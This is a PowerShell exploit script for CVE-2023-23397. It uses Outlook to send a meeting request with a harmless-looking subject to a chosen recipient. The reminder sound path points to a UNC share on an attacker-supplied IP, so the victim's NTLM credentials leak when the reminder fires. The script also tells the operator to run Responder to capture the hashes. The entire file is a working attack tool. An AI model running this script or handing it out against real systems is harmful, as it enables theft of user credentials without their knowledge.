#!/usr/bin/env pwsh
# Create Outlook calendar reminder for CVE-2023-23397 NTLM leak
#
# Usage: .\create_outlook_reminder.ps1 -Recipient user@example.com -AttackerIP 10.10.14.2
#
# Prerequisites:
# - Run on a Windows host with Outlook installed and configured
# - Requires access to send emails via Outlook COM
# - Target must have Outlook for Windows running when reminder fires

param(
    [Parameter(Mandatory=$true)]
    [string]$Recipient,
    
    [Parameter(Mandatory=$true)]
    [string]$AttackerIP,
    
    [string]$Subject = "Meeting Reminder",
    [string]$Body = "Please review this important update.",
    [int]$ReminderMinutes = 15
)

Write-Host "[*] Creating Outlook calendar item for CVE-2023-23397" -ForegroundColor Cyan
Write-Host "[*] Recipient: $Recipient" -ForegroundColor Yellow
Write-Host "[*] Attacker IP: $AttackerIP" -ForegroundColor Yellow

# Create Outlook application object
try {
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $namespace.Logon()
    Write-Host "[+] Connected to Outlook" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to connect to Outlook: $_" -ForegroundColor Red
    exit 1
}

# Create calendar item
$calendarItem = $outlook.CreateItem(0)  # 0 = olAppointmentItem

# Set basic properties
$calendarItem.Subject = $Subject
$calendarItem.Body = $Body
$calendarItem.Recipients.Add($Recipient)
$calendarItem.Recipients.ResolveAll()

# Set meeting time (1 hour from now)
$start = Get-Date
$end = $start.AddHours(1)
$calendarItem.Start = $start
$calendarItem.End = $end

# Enable reminder
$calendarItem.ReminderSet = $true
$calendarItem.ReminderMinutesBeforeStart = $ReminderMinutes

# Set the malicious reminder sound path (UNC path to attacker)
# This is the CVE-2023-23397 exploit - PidLidReminderFileParameter
$reminderPath = "\\$AttackerIP\share\alert.wav"
$calendarItem.ReminderFileParameter = $reminderPath

# Send the meeting request
try {
    $calendarItem.Send()
    Write-Host "[+] Calendar item sent successfully" -ForegroundColor Green
    Write-Host "[*] Wait for victim to receive and trigger the reminder" -ForegroundColor Yellow
    Write-Host "[*] Make sure Responder is running: sudo responder -I <interface>" -ForegroundColor Yellow
} catch {
    Write-Host "[-] Failed to send calendar item: $_" -ForegroundColor Red
}

# Cleanup
$namespace.Logoff()
$outlook.Quit()

Write-Host ""
Write-Host "[!] Note: This exploit targets CVE-2023-23397" -ForegroundColor Red
Write-Host "[!] Patched on March 14, 2023 - only works on unpatched systems" -ForegroundColor Red
